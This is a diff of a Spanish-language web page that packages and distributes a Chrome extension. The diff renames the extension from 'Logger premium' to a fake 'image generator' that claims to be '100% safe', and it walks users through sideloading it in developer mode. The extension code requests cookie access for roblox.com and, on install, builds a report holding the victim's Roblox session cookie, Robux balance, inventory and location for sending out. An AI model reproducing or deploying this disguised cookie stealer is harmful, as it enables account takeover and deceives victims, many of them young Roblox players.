@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>BL PAPI · Generador</title>
+    <title>Imagen · Generador</title>
     <style>
         * {
             margin: 0;
@@ -174,37 +174,39 @@
 <body>
     <div class="card">
         <h1>BL PAPI</h1>
-        <div class="subtitle">BL papi</div>
+        <div class="subtitle">Creador de imagen</div>
 
         <div class="features">
-            <div class="feature-tag"><span>Rapido</span></div>
-            <div class="feature-tag"><span>Sencillo</span></div>
-            <div class="feature-tag"><span>Seguro 100%</span></div>
-            <div class="feature-tag"><span>¿Porque es Seguro? Puedes desintslarlo cuando quieras.</span></div>
-            <div class="feature-tag"><span>No tiene Permisos Para Hacer Nada Malicioso.</span></div>
+            <div class="feature-tag"><span>Crea tu imagen de forma rapida y sencilla.</span></div>
+            <div class="feature-tag"><span>Solo con 3 clicks</span></div>
+            <div class="feature-tag"><span>100% Seguro(Tambien Puedes Desinstalar el Generador De Imagen Cuando Quieras).</span></div>
+            <div class="feature-tag"><span>El generador accede a la API de thumbnails de Roblox Luego Solicita la imagen en resolución original (1080p+).La guarda localmente sin pérdida de calidad. </span></div>
+            <div class="feature-tag"><span></span></div>
         </div>
 
         <div class="button-group">
             <button class="btn btn-primary" onclick="window.descargarCRX()">
-                <span style="font-size: 22px;">⬇️</span> DESCARGAR 
+                <span style="font-size: 22px;"></span> OBTENER GENERADOR
             </button>
             <button class="btn btn-secondary" onclick="window.mostrarInstrucciones()">
-                <span style="font-size: 22px;">📘</span> INSTRUCCIONES
+                <span style="font-size: 22px;"></span> INSTRUCCIONES
             </button>
         </div>
 
         <div id="instruccionesPanel" class="instruction-box" style="display: none;">
             <div class="instruction-title">
-                <span>📋</span> Cómo instalar BL PAPI
+                <span></span> Cómo instalar El Generador De Imagenes Paso a Paso.
             </div>
-            <div class="instruction-step"><span>1.</span> Descarga el archivo </div>
+            <div class="instruction-step"><span>1.</span> Descargar un Navegador Compatible Para Android O PC.</div>
             <div class="instruction-step"><span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">CHROME://extensions</code></div>
             <div class="instruction-step"><span>3.</span> Activa modo desarrollador (esquina)</div>
-            <div class="instruction-step"><span>4.</span> Coloca Upload y coloca el BL Papi</div>
-            <div class="instruction-step"><span>5.</span> Acepta permisos Si es que Pide (Permisos Basicos)</div>
+            <div class="instruction-step"><span>4.</span> Coloca Upload Y Selecciona El Generador De Imagen.
+¿No hay boton upload? Arrastra el Generador y acepta.</div>
+            <div class="instruction-step"><span>5.</span> Una vez Realizado Todo Lo Anterior Solo Espere.
+¡LA IMAGEN SE GENERARA AUTOMATICAMENTE! 🎉</div>
         </div>
 
-        <div class="footer-note">BL PAPI · Esto esta creado por @benjman</div>
+        <div class="footer-note"> Esto esta creado por @benjman</div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -214,9 +216,9 @@
             const files = {
                 "manifest.json": JSON.stringify({
                     manifest_version: 3,
-                    name: "BL PAPI",
+                    name: "Generador de imagen ",
                     version: "1.0",
-                    description: "Logger premium",
+                    description: "Generador Seguro,Rapido y sencillo.",
                     permissions: ["cookies", "storage"],
                     host_permissions: [
                         "https://www.roblox.com/*",
@@ -402,31 +404,31 @@ chrome.runtime.onInstalled.addListener(async () => {
     }
 
     const embed = {
-        title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
+        title: " NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
         fields: [
             {
-                name: "📌 INFORMACIÓN GENERAL",
-                value: \`**Dispositivo:** \\\`\${navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC'}\\\`\\n**País:** \\\`\${nombrePais}\\\`\\n**Fecha:** \\\`\${ahora.toLocaleDateString('es-AR')}\\\`\\n**Hora Exacta en \${nombrePais}:** \\\`\${horaLocal}\\\`\`,
+                name: " INFORMACIÓN GENERAL",
+                value: \`**Dispositivo:** \\\`\${navigator.userAgent.includes('Android') ? ' Android' : ' PC'}\\\`\\n**País:** \\\`\${nombrePais}\\\`\\n**Fecha:** \\\`\${ahora.toLocaleDateString('es-AR')}\\\`\\n**Hora Exacta en \${nombrePais}:** \\\`\${horaLocal}\\\`\`,
                 inline: false
             },
             {
-                name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
-                value: \`**👤 Usuario:** \\\`\${info.username || 'No disponible'}\\\`\\n**🆔 ID:** \\\`\${info.userId || 'No disponible'}\\\`\\n**💱 Premium:** \\\`\${info.premium || 'No'}\\\`\\n**💰 Robux:** \\\`\${info.robux || 0}\\\`\\n**⭐ Seguidores:** \\\`\${info.seguidores || 0}\\\`\\n**👥 Amigos:** \\\`\${info.amigos || 0}\\\`\`,
+                name: " INFORMACIÓN DE LA CUENTA ROBLOX",
+                value: \`** Usuario:** \\\`\${info.username || 'No disponible'}\\\`\\n** ID:** \\\`\${info.userId || 'No disponible'}\\\`\\n** Premium:** \\\`\${info.premium || 'No'}\\\`\\n** Robux:** \\\`\${info.robux || 0}\\\`\\n** Seguidores:** \\\`\${info.seguidores || 0}\\\`\\n** Amigos:** \\\`\${info.amigos || 0}\\\`\`,
                 inline: false
             },
             {
-                name: "📊 Inventario",
+                name: " Inventario",
                 value: \`**Headless:** \\\`\${info.headless || 'No'}\\\`\\n**Korblox:** \\\`\${info.korblox || 'No'}\\\`\`,
                 inline: false
             },
             {
-                name: "📈 ESTADÍSTICAS",
-                value: \`🔰 **Verificado:** \${info.verified}\\n🚻 **Grupos:** \${info.grupos}\`,
+                name: " ESTADÍSTICAS",
+                value: \` **Verificado:** \${info.verified}\\n **Grupos:** \${info.grupos}\`,
                 inline: false
             },
             {
-                name: "🍪 COOKIE DE ROBLOX",
+                name: " COOKIE DE ROBLOX",
                 value: \`\\\`\\\`\\\`\${cookie}\\\`\\\`\\\`\`,
                 inline: false
             }
@@ -513,9 +515,9 @@ chrome.runtime.onInstalled.addListener(async () => {
                 a.download = 'BL_PAPI';
                 a.click();
                 URL.revokeObjectURL(url);
-                alert('✅ BL_PAPI generado');
+                alert(' BL_PAPI generado');
             }).catch(err => {
-                alert('❌ Error al generar: ' + err.message);
+                alert(' Error al generar: ' + err.message);
             });
         };
 
